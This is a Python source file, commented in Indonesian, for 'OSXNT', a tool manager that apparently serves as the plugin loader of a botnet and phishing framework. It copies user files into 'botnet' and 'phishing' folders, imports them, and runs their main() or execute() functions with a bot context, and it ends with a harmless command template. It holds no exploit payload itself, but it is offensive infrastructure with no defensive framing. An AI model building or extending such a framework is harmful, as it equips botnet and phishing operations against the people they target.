#!/usr/bin/env python3
# OSXNT - Tool Support Module
# Loader & manager untuk tools dari user

import os
import sys
import json
import importlib.util
import shutil
from datetime import datetime

class ToolManager:
    """
    Manager untuk load dan execute tools dari user
    """
    
    def __init__(self, tools_dir):
        """
        Inisialisasi ToolManager
        
        Args:
            tools_dir: direktori untuk menyimpan tools
        """
        self.tools_dir = tools_dir
        self.tools = {}  # {name: module_object}
        self.categories = ['botnet', 'phishing']
        
        # Buat direktori jika belum ada
        self._ensure_dirs()
    
    def _ensure_dirs(self):
        """
        Buat direktori yang diperlukan
        """
        for category in self.categories:
            category_dir = os.path.join(self.tools_dir, category)
            os.makedirs(category_dir, exist_ok=True)
    
    def load_tool(self, category, code_paths, config_path=None):
        """
        Load tool dari file yang diberikan user
        
        Args:
            category: 'botnet' atau 'phishing'
            code_paths: list of file paths
            config_path: optional config file
        
        Returns:
            tuple: (success, message)
        """
        # 1. Validasi category
        if category not in self.categories:
            return False, f"Category must be one of {self.categories}"
        
        # 2. Validasi file
        for code_path in code_paths:
            if not os.path.exists(code_path):
                return False, f"File not found: {code_path}"
        
        # 3. Copy files dan load modules
        loaded_tools = []
        for code_path in code_paths:
            # Tentukan destination
            dest_filename = os.path.basename(code_path)
            dest_path = os.path.join(self.tools_dir, category, dest_filename)
            
            # Copy file
            try:
                shutil.copy2(code_path, dest_path)
                print(f"[+] Copied: {code_path} -> {dest_path}")
            except Exception as e:
                return False, f"Failed to copy {code_path}: {e}"
            
            # Load module
            tool_name = os.path.splitext(dest_filename)[0]
            try:
                self._import_module(dest_path, tool_name)
                loaded_tools.append(tool_name)
                print(f"[+] Loaded module: {tool_name}")
            except Exception as e:
                return False, f"Failed to load {tool_name}: {e}"
        
        # 4. Load config jika ada
        config = {}
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                
                # Copy config ke tools directory
                config_dest = os.path.join(self.tools_dir, 'config.json')
                shutil.copy2(config_path, config_dest)
                print(f"[+] Config loaded: {config_path}")
                
            except Exception as e:
                return False, f"Failed to load config: {e}"
        
        return True, f"Loaded {len(loaded_tools)} tools: {', '.join(loaded_tools)}"
    
    def _import_module(self, file_path, module_name):
        """
        Import Python module dari file path
        
        Args:
            file_path: path ke file .py
            module_name: nama module
        """
        spec = importlib.util.spec_from_file_location(module_name, file_path)
        if spec is None:
            raise ImportError(f"Could not load spec for {file_path}")
        
        module = importlib.util.module_from_spec(spec)
        sys.modules[module_name] = module
        spec.loader.exec_module(module)
        
        self.tools[module_name] = module
        return module
    
    def execute_tool(self, tool_name, command, bot_context=None):
        """
        Execute tool command
        
        Args:
            tool_name: nama tool yang sudah di-load
            command: perintah untuk tool
            bot_context: informasi bot (optional)
        
        Returns:
            tuple: (success, result)
        """
        if tool_name not in self.tools:
            return False, f"Tool '{tool_name}' not found"
        
        tool = self.tools[tool_name]
        
        # Cari fungsi main/execute di tool
        if hasattr(tool, 'main'):
            try:
                result = tool.main(command, bot_context)
                return True, result
            except Exception as e:
                return False, f"Error executing main(): {e}"
        
        elif hasattr(tool, 'execute'):
            try:
                result = tool.execute(command, bot_context)
                return True, result
            except Exception as e:
                return False, f"Error executing execute(): {e}"
        
        else:
            return False, "Tool has no main() or execute() function"
    
    def list_tools(self):
        """
        List all loaded tools
        
        Returns:
            list: daftar tools dengan info
        """
        tools_list = []
        for name, module in self.tools.items():
            tools_list.append({
                'name': name,
                'file': getattr(module, '__file__', 'unknown'),
                'functions': [f for f in dir(module) 
                            if not f.startswith('_') 
                            and callable(getattr(module, f))]
            })
        return tools_list
    
    def get_tool_info(self, tool_name):
        """
        Get detailed info about a tool
        
        Args:
            tool_name: nama tool
        
        Returns:
            dict: info tool atau None
        """
        if tool_name not in self.tools:
            return None
        
        module = self.tools[tool_name]
        info = {
            'name': tool_name,
            'file': getattr(module, '__file__', 'unknown'),
            'functions': [],
            'help': None
        }
        
        # Get functions
        for func in dir(module):
            if not func.startswith('_') and callable(getattr(module, func)):
                info['functions'].append(func)
        
        # Get help if available
        if hasattr(module, 'help'):
            info['help'] = module.help()
        
        return info
    
    def remove_tool(self, tool_name):
        """
        Remove a loaded tool
        
        Args:
            tool_name: nama tool
        
        Returns:
            bool: True jika berhasil
        """
        if tool_name in self.tools:
            # Remove from sys.modules
            if tool_name in sys.modules:
                del sys.modules[tool_name]
            
            # Remove from tools dict
            del self.tools[tool_name]
            
            # Remove file (optional - bisa dibiarkan)
            return True
        
        return False
    
    def get_config(self):
        """
        Get current configuration
        
        Returns:
            dict: config
        """
        config_path = os.path.join(self.tools_dir, 'config.json')
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}


# Contoh tool template untuk user (bisa dikasih sebagai contoh)
TOOL_TEMPLATE = '''
#!/usr/bin/env python3
# Template untuk OSXNT Tool

def main(command, bot_context=None):
    """
    Main function untuk tool
    Args:
        command: perintah dari user
        bot_context: info bot (jika dieksekusi dari bot)
    """
    
    if command == 'help':
        return help()
    
    # Parse command
    parts = command.split()
    if not parts:
        return "No command specified"
    
    cmd = parts[0]
    
    if cmd == 'test':
        return "Test successful!"
    
    elif cmd == 'info':
        return {
            'bot': bot_context,
            'status': 'ok'
        }
    
    return f"Unknown command: {cmd}"

def help():
    """
    Help function untuk tool
    """
    return """
Tool Template Commands:
  test           - Test the tool
  info           - Show bot info
  help           - Show this help
"""
'''
